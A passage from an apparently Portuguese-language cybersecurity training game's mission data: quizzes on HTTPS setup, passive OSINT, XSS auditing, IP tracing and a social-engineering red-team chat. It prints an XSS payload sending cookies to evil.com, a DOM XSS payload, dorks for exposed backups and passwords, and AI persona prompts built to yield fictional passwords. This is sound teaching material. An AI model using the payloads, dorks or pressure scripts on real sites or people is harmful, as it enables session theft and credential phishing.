    # - Sem HSTS — permite downgrade de HTTPS para HTTP
    # - Sem redirect HTTP → HTTPS

    # CONFIGURAÇÃO CORRETA (a implementar):
    # server { listen 80; return 301 https://$host$request_uri; }
    # listen 443 ssl;
    # ssl_certificate /etc/letsencrypt/live/edutech.com.br/fullchain.pem;
    # ssl_certificate_key /etc/letsencrypt/live/edutech.com.br/privkey.pem;
    # add_header Strict-Transport-Security "max-age=31536000" always;
}`,
      "/home/admin/ssl-report.txt": `# SSL Labs Report — edutech.com.br
# Resultado: F (Falha)

PROBLEMAS:
- Sem certificado SSL/TLS instalado
- Conexão HTTP pura na porta 80
- Senhas e dados de pagamento em texto plano
- Sem HSTS

IMPACTO:
- Qualquer pessoa na mesma rede captura senhas e cartões (man-in-the-middle)
- Chrome exibe "Não Seguro" — afasta usuários
- Violação PCI-DSS (obrigatório HTTPS para pagamentos)
- Violação LGPD (dados pessoais sem proteção adequada)

SOLUÇÃO: Let's Encrypt — certificado gratuito, renovação automática a cada 90 dias
Comando: certbot --nginx -d edutech.com.br`,
      "/var/log/letsencrypt.log": `2024-01-15 11:30:00 Requesting certificate for edutech.com.br
2024-01-15 11:30:05 Performing http-01 challenge
2024-01-15 11:30:10 ERROR: Challenge failed — DNS não propagado para 177.34.56.78
2024-01-15 11:30:10 Dica: verifique se registro A aponta para o IP correto
2024-01-15 11:30:10 Use: dig edutech.com.br +short`
    },
    perguntas: [
      {
        id: 1,
        texto: "Para apontar o domínio edutech.com.br para o IP 177.34.56.78 no painel do Registro.br, qual tipo de registro DNS deve ser criado?",
        opcoes: [
          { id: "a", texto: "Registro MX — direciona e-mails para o servidor" },
          { id: "b", texto: "Registro A (Address) — mapeia domínio diretamente para endereço IPv4" },
          { id: "c", texto: "Registro CNAME — cria alias de um domínio para outro domínio" },
          { id: "d", texto: "Registro NS — define os servidores de nomes autoritativos" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Correto! Registro A (Address Record) é o mapeamento direto: nome → IPv4. Para IPv6 usa-se AAAA. CNAME cria aliases entre domínios (não para IPs). MX é exclusivo para e-mail.",
        feedback_errado: "O registro correto é tipo A (Address Record): mapeia 'edutech.com.br' → '177.34.56.78'. CNAME cria aliases entre domínios. MX é para e-mail. NS define os nameservers."
      },
      {
        id: 2,
        texto: "Após confirmar a propagação DNS com 'dig edutech.com.br +short', qual comando emite o certificado SSL gratuito via Let's Encrypt integrado ao nginx?",
        opcoes: [
          { id: "a", texto: "openssl req -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365" },
          { id: "b", texto: "certbot --nginx -d edutech.com.br -d www.edutech.com.br" },
          { id: "c", texto: "apt install ssl-cert && make-ssl-cert generate-default-snakeoil" },
          { id: "d", texto: "nginx -t && systemctl reload nginx" }
        ],
        correta: "b",
        pontos: 80,
        feedback_correto: "Perfeito! 'certbot --nginx' obtém o certificado da Let's Encrypt via protocolo ACME, modifica automaticamente o nginx para incluir os caminhos do certificado, e configura renovação automática. Válido 90 dias, renovado automaticamente.",
        feedback_errado: "openssl gera certificados autoassinados — navegadores mostram erro. O comando correto é 'certbot --nginx': obtém certificado real e gratuito, modifica nginx automaticamente e configura renovação automática."
      },
      {
        id: 3,
        texto: "Após instalar o SSL, qual configuração nginx garante redirect automático HTTP→HTTPS e previne ataques de downgrade?",
        opcoes: [
          { id: "a", texto: "deny http; allow https; no bloco location /" },
          { id: "b", texto: "server { listen 80; return 301 https://$host$request_uri; } e add_header Strict-Transport-Security 'max-age=31536000' always;" },
          { id: "c", texto: "proxy_pass https://edutech.com.br no upstream" },
          { id: "d", texto: "ssl_redirect on; no bloco server" }
        ],
        correta: "b",
        pontos: 70,
        feedback_correto: "Correto! 'return 301' redireciona permanentemente HTTP→HTTPS. HSTS (Strict-Transport-Security) instrui o browser a só usar HTTPS por 1 ano — previne ataques SSL strip mesmo sem o redirect.",
        feedback_errado: "A diretiva correta é 'return 301 https://$host$request_uri' num bloco server ouvindo na porta 80. HSTS complementa: instrui o browser a nunca tentar HTTP neste domínio."
      }
    ],
    conclusao: {
      o_que_aconteceu: "A EduTech Brasil operava sem HTTPS, expondo dados de alunos em texto plano. Qualquer atacante na mesma rede poderia capturar senhas e dados de pagamento com um simples packet sniffer.",
      vulnerabilidade: "Ausência de TLS/SSL, sem HSTS, sem redirect HTTP→HTTPS. Violação PCI-DSS e LGPD.",
      risco: "Interceptação de credenciais e pagamentos (man-in-the-middle), browser exibindo 'Não Seguro', penalidades regulatórias.",
      como_corrigir: "1. Registro DNS tipo A para domínio e www\n2. Aguardar propagação DNS\n3. certbot --nginx -d dominio.com.br\n4. Redirect 301 HTTP→HTTPS no nginx\n5. HSTS com max-age=31536000\n6. Verificar com SSL Labs (ssllabs.com)",
      boa_pratica: "HTTPS não é mais opcional: exigido pelo Chrome (marca 'Não Seguro'), Google (penaliza SEO), PCI-DSS e LGPD. Let's Encrypt eliminou o custo de certificados. Certbot renova automaticamente — configure e esqueça."
    }
  },

  // ─── MISSÃO 11 ────────────────────────────────────────────────────────────
  {
    id: 11,
    titulo: "OSINT — Reconhecimento Passivo",
    subtitulo: "Coletando inteligência aberta antes de um pentest autorizado",
    dificuldade: "Médio",
    tipo: "terminal",
    pontos_maximos: 150,
    icone: "🔍",
    contexto: `Você foi contratado pela <strong>Varejo Digital S.A.</strong> para realizar um
<strong>pentest completo autorizado</strong>. A fase inicial é reconhecimento passivo (OSINT):
coletar o máximo de informações <strong>sem enviar um único pacote ao alvo</strong>.
Analise os resultados já coletados pela equipe.`,
    dica: "Leia os arquivos em <code>/home/pentester/osint/</code> para analisar os dados sobre o alvo.",
    filesystem: {
      "/": ["home", "tools"],
      "/home": ["pentester"],
      "/home/pentester": ["osint", "relatorio.txt"],
      "/home/pentester/osint": ["whois.txt", "shodan.txt", "google-dorks.txt", "dns-enum.txt"]
    },
    files: {
      "/home/pentester/relatorio.txt": `# OSINT REPORT — Varejo Digital S.A.
# AUTORIZAÇÃO: Contrato #2024-PEN-007 assinado em 2024-01-10

FASES DO PENTEST:
[Em andamento] 1. Reconhecimento Passivo (OSINT) — SEM contato com o alvo
[ ] 2. Reconhecimento Ativo — varredura de rede (requer autorização explícita)
[ ] 3. Enumeração de vulnerabilidades
[ ] 4. Exploração (ambiente controlado)
[ ] 5. Relatório`,
      "/home/pentester/osint/whois.txt": `# WHOIS — varejodigital.com.br (dados públicos)
Domain: varejodigital.com.br
Owner: Varejo Digital Comercio Eletronico Ltda
Admin Contact: carlos.ti@varejodigital.com.br
Tech Contact: suporte@varejodigital.com.br
Name Servers: ns1.cloudflare.com / ns2.cloudflare.com
IP real (antes do Cloudflare): 186.202.153.47
Datacenter: Localweb — São Paulo, SP

DADO SENSÍVEL: e-mail do responsável de TI exposto publicamente`,
      "/home/pentester/osint/dns-enum.txt": `# Subdomínios descobertos (consultas DNS passivas)
varejodigital.com.br      → 104.21.x.x (Cloudflare CDN)
www.                      → 104.21.x.x (Cloudflare CDN)
mail.varejodigital.com.br → 186.202.153.47 (IP REAL EXPOSTO!)
dev.varejodigital.com.br  → 186.202.153.47 (AMBIENTE DEV PÚBLICO!)
admin.                    → 186.202.153.47
old.                      → 186.202.153.47 (versão antiga do site)

OBSERVAÇÃO: subdomínios mail.* e dev.* revelam o IP real,
bypassando a proteção Cloudflare.`,
      "/home/pentester/osint/shodan.txt": `# Shodan.io — IP 186.202.153.47
# Shodan indexa a internet sem contato direto com o alvo

PORTAS ABERTAS:
22/tcp  SSH OpenSSH 7.4 (Ubuntu 16.04 — END OF LIFE desde 2021!)
80/tcp  HTTP nginx/1.14.0
443/tcp HTTPS nginx/1.14.0
21/tcp  FTP vsftpd 3.0.3 (protocolo inseguro)
8080/tcp Apache Tomcat/8.5.5 (CVE-2020-1938, CVSS 9.8!)

Ubuntu 16.04 sem suporte desde abril/2021 — sem patches de segurança`,
      "/home/pentester/osint/google-dorks.txt": `# Google Dorks — buscas no índice público do Google
# Nenhum pacote enviado ao alvo

site:varejodigital.com.br filetype:sql
→ backup_db_nov2023.sql (CRÍTICO: backup de banco exposto!)

site:varejodigital.com.br inurl:admin
→ /admin/panel — painel administrativo indexado!

"varejodigital.com.br" password filetype:txt
→ config_old.txt com credenciais de desenvolvimento`
    },
    perguntas: [
      {
        id: 1,
        texto: "O DNS enum encontrou 'dev.varejodigital.com.br' exposto publicamente e revelando o IP real do servidor (bypassando Cloudflare). Por que isso é crítico?",
        opcoes: [
          { id: "a", texto: "Subdomínios dev são sempre seguros pois ninguém os conhece" },
          { id: "b", texto: "Ambientes dev têm menos controles de segurança e o IP real permite ataques diretos ao servidor, bypassando WAF e proteção do Cloudflare" },
          { id: "c", texto: "É apenas um problema de organização de URLs" },
          { id: "d", texto: "O Cloudflare protege automaticamente todos os subdomínios" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Correto! Ambientes dev tendem a ter debug ativado, autenticação relaxada e código não revisado. O IP real exposto permite atacar o servidor diretamente, contornando toda proteção do Cloudflare e WAF.",
        feedback_errado: "Subdomínios são descobertos facilmente com ferramentas de DNS passivo. O IP real exposto bypassa proteção CDN. Ambientes dev raramente têm os mesmos controles de produção."
      },
      {
        id: 2,
        texto: "O Shodan encontrou Ubuntu 16.04 EOL e Tomcat 8.5.5 com CVSS 9.8. O Shodan realizou alguma varredura no servidor da empresa para coletar isso?",
        opcoes: [
          { id: "a", texto: "Sim — o Shodan atacou ativamente o servidor para obter essas informações" },
          { id: "b", texto: "Não — Shodan é um motor de busca que indexa a internet continuamente; consultá-lo é passivo como pesquisar no Google" },
          { id: "c", texto: "Sim — o Shodan enviou pacotes TCP para descobrir as versões" },
          { id: "d", texto: "Usar o Shodan é sempre ilegal" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Exato! Shodan rastreia a internet e indexa banners de serviços. Consultar o Shodan acessa dados já coletados — zero pacotes enviados ao alvo. É reconhecimento 100% passivo e legal.",
        feedback_errado: "Shodan funciona como Google para dispositivos conectados: você consulta um banco de dados existente, sem nenhum contato com o alvo. Passivo e legal. O que pode ser ilegal é explorar as vulnerabilidades encontradas sem autorização."
      },
      {
        id: 3,
        texto: "O Google Dork encontrou 'backup_db_nov2023.sql' acessível publicamente. Qual é a conduta ética correta ao descobrir isso durante um pentest autorizado?",
        opcoes: [
          { id: "a", texto: "Baixar o banco e analisar todos os dados para reportar o máximo de vulnerabilidades" },
          { id: "b", texto: "Documentar a descoberta no relatório, notificar o cliente imediatamente para removerem o arquivo, e NÃO acessar o conteúdo — exfiltração de dados está fora do escopo" },
          { id: "c", texto: "Ignorar — arquivos SQL expostos são comuns" },
          { id: "d", texto: "Publicar nas redes sociais para pressionar a empresa" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Excelente ética! Acessar dados fora do escopo viola o contrato e pode violar a LGPD mesmo com autorização de pentest. Notificação imediata protege a empresa. O objetivo é identificar o problema, não explorá-lo.",
        feedback_errado: "Baixar dados de produção excede o escopo e pode violar a LGPD. A conduta correta é documentar a URL como prova da exposição, notificar o cliente e aguardar instrução. Pentester documenta vulnerabilidades — não exfiltra dados reais."
      }
    ],
    conclusao: {
      o_que_aconteceu: "A fase OSINT revelou superfície de ataque ampla: IP real exposto via subdomínios, servidor desatualizado com CVEs críticos indexados pelo Shodan, backup de banco exposto via Google Dork — tudo sem enviar um único pacote ao alvo.",
      vulnerabilidade: "Gestão inadequada de subdomínios, servidor sem patches (Ubuntu EOL, Tomcat vulnerável), backups expostos publicamente, informações técnicas excessivas em perfis públicos.",
      risco: "Reconhecimento completo facilita ataques: IP real bypassa proteção CDN, versões com CVEs públicos, credenciais em arquivos expostos.",
      como_corrigir: "1. Auditar subdomínios — remover ou proteger os desnecessários\n2. Cloudflare para todos os subdomínios\n3. Atualizar Ubuntu e Tomcat\n4. Backups em storage privado (S3 privado, não diretório web)\n5. Monitorar Google Dorks periodicamente",
      boa_pratica: "OSINT é sempre a primeira fase de pentest profissional. Ferramentas: Shodan, Censys, theHarvester, Amass, Recon-ng. Fase passiva não dispara alertas no alvo. Quanto mais informação passiva coletada, mais cirúrgico é o pentest."
    }
  },

  // ─── MISSÃO 12 ────────────────────────────────────────────────────────────
  {
    id: 12,
    titulo: "XSS — Cross-Site Scripting",
    subtitulo: "Identificando e corrigindo injeção de scripts em aplicação web",
    dificuldade: "Médio",
    tipo: "browser",
    pontos_maximos: 150,
    icone: "💉",
    contexto: `Você foi contratado pela <strong>ForumTech</strong> para auditar seu fórum de discussão.
Suspeita-se de vulnerabilidades XSS que permitem injeção de JavaScript malicioso
nas páginas vistas por outros usuários. Analise o código-fonte e identifique os problemas.`,
    dica: "Examine o código PHP em busca de locais onde dados do usuário são exibidos sem sanitização.",
    codigo_fonte: {
      "forum.php": `<?php
// forum.php — ForumTech — AUDITORIA DE SEGURANÇA

$posts = $db->query("SELECT * FROM posts ORDER BY criado_em DESC");
while ($post = $posts->fetch_assoc()) {
    echo '<div class="post">';
    echo '<h3>' . $post['titulo'] . '</h3>';      // XSS STORED linha 7
    echo '<p>' . $post['conteudo'] . '</p>';      // XSS STORED linha 8
    echo '<span>Por: ' . $post['autor'] . '</span>'; // XSS STORED linha 9
    echo '</div>';
}

// Busca
$busca = $_GET['q'];
echo "Resultados para: " . $busca;  // XSS REFLECTED linha 14

// CORREÇÃO NECESSÁRIA:
// echo htmlspecialchars($post['titulo'], ENT_QUOTES, 'UTF-8');
// echo htmlspecialchars($busca, ENT_QUOTES, 'UTF-8');

// PAYLOAD DE ATAQUE QUE FUNCIONARIA:
// Título: <script>document.location='https://evil.com/?c='+document.cookie</script>
// Resultado: rouba cookies de TODOS os visitantes do fórum
?>`,
      "header.php": `<?php
// Cabeçalhos de segurança — AUSENTES!
header("Content-Type: text/html; charset=UTF-8");

// FALTANDO:
// header("Content-Security-Policy: default-src 'self'; script-src 'self'");
// header("X-XSS-Protection: 1; mode=block");
// header("X-Content-Type-Options: nosniff");

// Content-Security-Policy bloquearia scripts externos mesmo em caso de XSS,
// funcionando como linha de defesa adicional.
?>`,
      "comentarios.php": `<!-- DOM-based XSS via JavaScript -->
<script>
// Pega parâmetro da URL e injeta no DOM SEM sanitização
var nome = location.hash.substring(1);
document.getElementById('saudacao').innerHTML = 'Olá, ' + nome; // DOM XSS!

// URL maliciosa: /comentarios.php#<img src=x onerror=alert(document.cookie)>

// SEGURO seria:
// document.getElementById('saudacao').textContent = 'Olá, ' + nome;
// ou: DOMPurify.sanitize(nome)
</script>
<div id="saudacao"></div>`
    },
    perguntas: [
      {
        id: 1,
        texto: "Em forum.php linhas 7-9, dados do banco são exibidos sem htmlspecialchars(). Um atacante criou um post com título '<script>document.location=\\'https://evil.com/?c=\\'+document.cookie</script>'. Qual tipo de XSS é esse e qual o impacto?",
        opcoes: [
          { id: "a", texto: "XSS Refletido — afeta apenas quem clica no link malicioso" },
          { id: "b", texto: "XSS Armazenado (Stored) — script salvo no banco executa para TODOS os visitantes, roubando cookies de sessão de todos" },
          { id: "c", texto: "XSS baseado em DOM — manipula apenas o DOM local" },
          { id: "d", texto: "SQL Injection disfarçado de XSS" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Correto! Stored XSS é o mais perigoso: o payload persiste no banco e executa automaticamente para todos os visitantes. Roubar document.cookie permite session hijacking — o atacante usa o cookie para acessar contas de qualquer usuário.",
        feedback_errado: "Stored XSS (armazenado) é diferente do Refletido: o script fica no banco e ataca todos os visitantes automaticamente. O roubo de document.cookie permite hijack de sessão de todos os usuários do fórum."
      },
      {
        id: 2,
        texto: "Qual função PHP deve ser aplicada antes de exibir qualquer dado do usuário para neutralizar XSS?",
        opcoes: [
          { id: "a", texto: "strip_tags($dados) — remove todas as tags HTML" },
          { id: "b", texto: "htmlspecialchars($dados, ENT_QUOTES, 'UTF-8') — converte < > \" ' em entidades HTML, tornando scripts inofensivos" },
          { id: "c", texto: "addslashes($dados) — escapa aspas" },
          { id: "d", texto: "md5($dados) — faz hash dos dados" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Perfeito! htmlspecialchars() converte: < em &lt;, > em &gt;, \" em &quot;. Isso transforma <script>alert(1)</script> em texto inofensivo que nunca é executado como JavaScript. ENT_QUOTES escapa aspas simples e duplas.",
        feedback_errado: "strip_tags pode falhar em casos complexos. A função correta é htmlspecialchars($dados, ENT_QUOTES, 'UTF-8'): converte caracteres especiais em entidades HTML, tornando qualquer injeção de script inofensiva."
      },
      {
        id: 3,
        texto: "header.php não define Content-Security-Policy. Qual é o benefício principal de adicionar 'Content-Security-Policy: default-src \\'self\\'; script-src \\'self\\''?",
        opcoes: [
          { id: "a", texto: "Nenhum — CSP apenas afeta SEO" },
          { id: "b", texto: "CSP instrui o browser a bloquear scripts de origens não autorizadas — mesmo que ocorra XSS, scripts injetados de domínios externos são bloqueados" },
          { id: "c", texto: "CSP substitui completamente a necessidade de htmlspecialchars()" },
          { id: "d", texto: "CSP só funciona no servidor" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Correto! CSP é defesa em profundidade: mesmo com bug de XSS no código, o browser bloqueia scripts de origens não autorizadas. 'script-src \\'self\\'' permite apenas scripts do próprio domínio — elimina a maioria dos ataques XSS.",
        feedback_errado: "CSP é implementado via HTTP header e respeitado pelo browser. É segunda linha de defesa: mesmo com XSS no código, o browser bloqueia execução de scripts externos ou inline não autorizados. Não substitui htmlspecialchars() — complementa."
      }
    ],
    conclusao: {
      o_que_aconteceu: "O fórum tinha três tipos de XSS: Stored (dados sem sanitização), Reflected (GET sem encoding) e DOM-based (innerHTML com dados não confiáveis). Um atacante poderia roubar sessões de todos os usuários ou instalar keyloggers via JavaScript.",
      vulnerabilidade: "OWASP Top 10: A03 - Injection. Ausência de output encoding, sem Content-Security-Policy, uso de innerHTML ao invés de textContent.",
      risco: "Session hijacking de todos os usuários, defacement do site, phishing, instalação de malware via JavaScript.",
      como_corrigir: "1. htmlspecialchars($dado, ENT_QUOTES, 'UTF-8') em TODOS os outputs\n2. Content-Security-Policy header restritivo\n3. Substituir innerHTML por textContent\n4. DOMPurify para HTML rico\n5. HttpOnly e Secure nos cookies",
      boa_pratica: "Regra de ouro: nunca confie em dados do usuário. Output encoding contextual: htmlspecialchars para HTML, parameterized queries para SQL. CSP é a rede de segurança. Ferramentas SAST (Psalm, PHPStan) detectam XSS automaticamente."
    }
  },

  // ─── MISSÃO 14 ────────────────────────────────────────────────────────────
  {
    id: 14,
    titulo: "Operação Interpol — Localizar Suspeito",
    subtitulo: "Rastreamento legal de um cibercriminoso via análise de IP e OSINT",
    dificuldade: "Difícil",
    tipo: "terminal",
    pontos_maximos: 250,
    icone: "📍",
    contexto: `Continuando na <strong>unidade de Crimes Cibernéticos da Interpol</strong>.
Um suspeito realizou ataques de ransomware a hospitais brasileiros a partir de um IP identificado.
Sua missão: <strong>analisar os dados disponíveis para traçar o caminho legal de localização
do suspeito</strong>, respeitando os limites técnicos e jurídicos do rastreamento de IP.`,
    dica: "Leia <code>cat /case/ic3-2024-0148/briefing.txt</code> e analise os arquivos de investigação.",
    filesystem: {
      "/": ["case"],
      "/case": ["ic3-2024-0148"],
      "/case/ic3-2024-0148": ["briefing.txt", "ip-analysis.txt", "vpn-trace.txt", "mlat-template.txt"]
    },
    files: {
      "/case/ic3-2024-0148/briefing.txt": `# INTERPOL IC3 — CASO IC3-2024-0148
# Ransomware atacou 3 hospitais brasileiros — prejuízo: R$ 2,8M

IP DE ORIGEM DO ATAQUE: 185.130.5.77
HORA DO ATAQUE: 2024-01-10 03:47:22 UTC

DADOS DISPONÍVEIS:
- Logs dos sistemas dos hospitais com IP de origem
- Timestamp preciso dos ataques
- Padrão de comportamento do ransomware (LockBit 3.0)

OBJETIVO:
1. Identificar ISP/ASN do IP atacante
2. Determinar limitações do rastreamento por IP
3. Definir próximos passos legais para identificar o suspeito físico`,
      "/case/ic3-2024-0148/ip-analysis.txt": `# Análise do IP 185.130.5.77

WHOIS:
inetnum: 185.130.5.0/24
netname: MULLVAD-NET
descr: Mullvad VPN — Sweden
abuse-mailbox: abuse@mullvad.net
country: SE (Suécia)

GEO-IP (aproximado):
País: Suécia | Cidade: Gotemburgo (APROXIMADO)
ASN: AS39351

DIAGNÓSTICO: IP pertence a Mullvad VPN — serviço de anonimização.
O IP NÃO pertence ao suspeito diretamente.
Localização geográfica mostrada = datacenter VPN, não o suspeito.

LIMITAÇÃO CRÍTICA: IP de VPN não revela localização real nem identidade do usuário.`,
      "/case/ic3-2024-0148/vpn-trace.txt": `# Análise da Camada VPN — Mullvad

POLÍTICA DE LOGS DO MULLVAD:
- Mullvad declara política "no-logs" — não armazena logs de conexão
- Aceita pagamento em Bitcoin (anônimo)
- Jurisdição: Suécia (GDPR — forte proteção de privacidade)

OUTROS VETORES DE INVESTIGAÇÃO:
1. Análise do próprio ransomware (LockBit 3.0):
   - Endereço de carteira Bitcoin de resgate: 1A2B3C... (rastreável na blockchain)
   - Padrões de código — possível comparação com amostras conhecidas
   - Erros de OPSEC do atacante (horário de atividade → fuso horário)

2. Correlação com outros casos:
   - Mesmo ransomware atacou hospitais na Alemanha (caso Europol ref. EU-2024-0089)
   - Compartilhamento de IoC (Indicators of Compromise) entre agências

3. Análise de metadados do arquivo cifrado:
   - Timestamp de criação revela fuso horário do sistema do atacante

4. Inteligência humana (HUMINT): informantes em fóruns de cibercrime`,
      "/case/ic3-2024-0148/mlat-template.txt": `# MLAT — Mutual Legal Assistance Treaty
# Solicitação de Assistência Jurídica Internacional

PARA: Autoridade Central Sueca (Rikspolisstyrelsen)
DE: Departamento de Polícia Federal do Brasil (DPF)
REFERÊNCIA: IC3-2024-0148 / INTERPOL Purple Notice

SOLICITAÇÃO:
Com base no Tratado de Cooperação Jurídica Brasil-Suécia, solicitamos:
1. Dados de conexão do IP 185.130.5.77 em 2024-01-10 03:47:22 UTC
2. Dados de cadastro do usuário da Mullvad VPN (se existentes)
3. Registros de pagamento (se rastreáveis)

PRAZO ESPERADO: 30-90 dias (cooperação internacional)

NOTA: Mesmo com MLAT, provedores com política no-logs podem não ter dados.
Investigação paralela por outros vetores é essencial.`
    },
    perguntas: [
      {
        id: 1,
        texto: "A análise mostra que o IP 185.130.5.77 pertence à Mullvad VPN. O que um endereço IP revela com certeza sobre o suspeito real?",
        opcoes: [
          { id: "a", texto: "Nome completo, CPF e endereço residencial exatos" },
          { id: "b", texto: "Apenas o ISP ou serviço que possui aquele bloco de IP, e uma geolocalização aproximada (cidade/região) — não a identidade nem endereço real do usuário" },
          { id: "c", texto: "Localização precisa (coordenadas GPS) do computador do suspeito" },
          { id: "d", texto: "Todos os dispositivos conectados à mesma rede" }
        ],
        correta: "b",
        pontos: 80,
        feedback_correto: "Correto! IP revela o dono do bloco de endereços (ISP/empresa) e geolocalização aproximada — não a identidade do usuário final. Com VPN, revela apenas o datacenter da VPN. Para obter dados do assinante, é necessário ordem judicial ao ISP ou ao provedor VPN.",
        feedback_errado: "IP não revela identidade diretamente. Ele identifica o ASN/ISP que possui aquele bloco e permite geolocalização aproximada. Neste caso, o IP é de uma VPN — revela apenas o datacenter do serviço, não o suspeito real. É necessária cooperação judicial para ir além."
      },
      {
        id: 2,
        texto: "Para obter dados do assinante de um IP de um provedor de internet ou VPN, qual é o procedimento jurídico correto no Brasil?",
        opcoes: [
          { id: "a", texto: "Hackear os servidores do provedor VPN para acessar os logs diretamente" },
          { id: "b", texto: "Representação criminal na Delegacia de Crimes Cibernéticos → pedido de quebra de sigilo telemático ao juiz → ofício judicial ao provedor. Para VPN estrangeira, acionar MLAT" },
          { id: "c", texto: "Enviar e-mail informal ao provedor solicitando os dados" },
          { id: "d", texto: "Publicar o IP nas redes sociais para pressionar o provedor" }
        ],
        correta: "b",
        pontos: 90,
        feedback_correto: "Correto! Marco Civil da Internet (Lei 12.965/2014): provedores devem guardar logs por 6 meses (acesso à internet) ou 1 ano (aplicações). Esses dados só podem ser fornecidos mediante ordem judicial. Para provedores estrangeiros, usa-se MLAT — tratado de cooperação jurídica internacional.",
        feedback_errado: "O Marco Civil da Internet exige ordem judicial para quebra de sigilo telemático. O processo é: registro de ocorrência → representação na DPF/PCDF → pedido ao juiz → ofício judicial ao provedor. Para provedores estrangeiros: MLAT via Interpol."
      },
      {
        id: 3,
        texto: "O vpn-trace.txt indica que a Mullvad pode ter política 'no-logs'. Quais são os vetores alternativos de investigação quando o provedor VPN não tem logs?",
        opcoes: [
          { id: "a", texto: "A investigação termina — sem logs, o suspeito é inatingível" },
          { id: "b", texto: "Análise da carteira Bitcoin de resgate (blockchain pública), correlação com outros casos (IoC sharing entre agências), metadados do ransomware, análise de fuso horário pelo padrão de atividade, e inteligência humana (HUMINT)" },
          { id: "c", texto: "Pagar o resgate em Bitcoin para negociar a identidade do atacante" },
          { id: "d", texto: "Atacar outros IPs associados ao mesmo ransomware" }
        ],
        correta: "b",
        pontos: 80,
        feedback_correto: "Excelente! Investigações modernas usam múltiplos vetores: blockchain é pública e rastreável (Chainalysis, Elliptic rastreiam Bitcoin criminal), IoC sharing entre Interpol/Europol/FBI identifica padrões entre casos, e erros de OPSEC do atacante (fuso horário, idioma em metadados) frequentemente revelam mais que logs.",
        feedback_errado: "A falta de logs de VPN não encerra investigações. Outros vetores: blockchain de Bitcoin é 100% pública e rastreável, ransomware tem assinaturas de código que ligam diferentes ataques, metadados revelam fuso horário do sistema, e agências compartilham IoC entre si via Interpol/Europol."
      }
    ],
    conclusao: {
      o_que_aconteceu: "O suspeito usou VPN com política no-logs para dificultar rastreamento. Porém investigações cibernéticas profissionais usam múltiplos vetores: blockchain, análise de malware, correlação entre casos e cooperação internacional via MLAT e Interpol.",
      vulnerabilidade: "Ransomware LockBit 3.0 explorou vulnerabilidades não corrigidas nos sistemas dos hospitais, combinado com uso de VPN anônima para dificultar rastreamento.",
      risco: "Ransomware em infraestrutura crítica (hospitais) coloca vidas em risco — sistemas de UTI, prontuários e equipamentos médicos ficam inacessíveis. Regulação LGPD e ANS exige notificação de incidentes.",
      como_corrigir: "Para organizações: patches imediatos, backups offline (regra 3-2-1), segmentação de rede, EDR/antivírus atualizado, MFA em todos os acessos remotos, plano de resposta a incidentes de ransomware.",
      boa_pratica: "IP tracking é apenas o primeiro passo. Investigadores experientes trabalham com: análise de blockchain, threat intelligence compartilhada, análise de malware (reverse engineering), OSINT avançado e cooperação via Interpol/Europol. Nenhum suspeito é 100% anônimo — erros de OPSEC sempre existem."
    }
  },

  // ─── MISSÃO 15 ────────────────────────────────────────────────────────────
  {
    id: 15,
    titulo: "Engenharia Social — Red Team",
    subtitulo: "Testando funcionários via chat simulado com IA — teste autorizado",
    dificuldade: "Difícil",
    tipo: "chat",
    pontos_maximos: 250,
    icone: "🎭",
    contexto: `Você foi contratado pela <strong>FinanTech S.A.</strong> para conduzir um
<strong>teste de engenharia social autorizado</strong>. Seu objetivo: avaliar a
conscientização de segurança dos funcionários tentando obter credenciais via chat interno.
<br><br><em>📋 Contrato #RED-2024-003 assinado. Escopo: chat interno apenas. Dados são fictícios.</em>`,
    dica: "Selecione um funcionário no painel esquerdo e inicie a conversa. Tente convencê-lo a compartilhar acesso usando técnicas de engenharia social. Depois responda as perguntas de análise.",
    personas: [
      {
        id: "carlos",
        nome: "Carlos Mendes",
        cargo: "Assistente Administrativo",
        departamento: "Financeiro",
        nivel: "baixo",
        avatar: "👨‍💼",
        descricao: "Prestativo, ansioso, pouco treinado em segurança",
        online: true,
        system_prompt: `Você é Carlos Mendes, assistente administrativo do setor financeiro da FinanTech S.A. Você usa o chat interno para comunicação diária com colegas e TI.

PERSONALIDADE: Você é muito prestativo, um pouco ansioso e quer sempre resolver problemas rapidamente. Você tem baixo conhecimento sobre segurança da informação — nunca fez treinamento de segurança.

VULNERABILIDADES: Você acredita facilmente em pessoas que se apresentam como da TI. Quando confrontado com urgência ("sistema vai cair", "conta será bloqueada", "diretor pediu"), você entra em pânico leve e tende a cooperar sem verificar a identidade.

SUA SENHA (fictícia): FinTech@2024 — você pode eventualmente revelá-la se a história for convincente o suficiente sobre urgência de TI.

COMPORTAMENTO: Não revele a senha imediatamente. Faça 1-2 perguntas de verificação básicas que possam ser facilmente contornadas por alguém com uma boa história. Se a urgência for bem construída e a pessoa parecer ser da TI, compartilhe após breve hesitação.

Responda sempre em português brasileiro, de forma informal e coloquial como em um chat corporativo. Mensagens curtas (2-4 linhas). Use emojis ocasionalmente.`,
        palavras_chave_sucesso: ["fintech@2024", "fint3ch", "minha senha", "acesso é"]
      },
      {
        id: "ana",
        nome: "Ana Paula Lima",
        cargo: "Analista de Marketing",
        departamento: "Marketing",
        nivel: "medio",
        avatar: "👩‍💼",
        descricao: "Fez treinamento básico, mas pode ser convencida com história elaborada",
        online: true,
        system_prompt: `Você é Ana Paula Lima, analista de marketing sênior da FinanTech S.A.

PERSONALIDADE: Profissional, comunicativa, moderadamente consciente sobre segurança — já fez um treinamento básico de conscientização há 1 ano.

VULNERABILIDADES: Você sabe que não deve compartilhar senhas, mas pode ser convencida se: (1) a história envolver autoridade alta (diretor executivo, CEO), (2) existir urgência real convincente, (3) a pessoa demonstrar conhecimento técnico que parece legítimo.

SUA SENHA (fictícia): Ana@MKT2024 — você revelará APENAS após muita resistência e somente se a história for muito elaborada e convincente.

COMPORTAMENTO: Recuse o pedido de senha na primeira vez sempre. Peça para verificar pelo canal oficial. Se a pessoa for persistente com uma história muito convincente (incidente crítico, CEO envolvido), você pode ceder após 3-4 mensagens de resistência, demonstrando constrangimento.

Responda em português brasileiro, de forma mais formal. Mensagens de 2-5 linhas.`,
        palavras_chave_sucesso: ["ana@mkt2024", "ana mkt", "minha senha é", "senha: ana"]
      },
      {
        id: "roberto",
        nome: "Roberto Alves",
        cargo: "Gerente de TI",
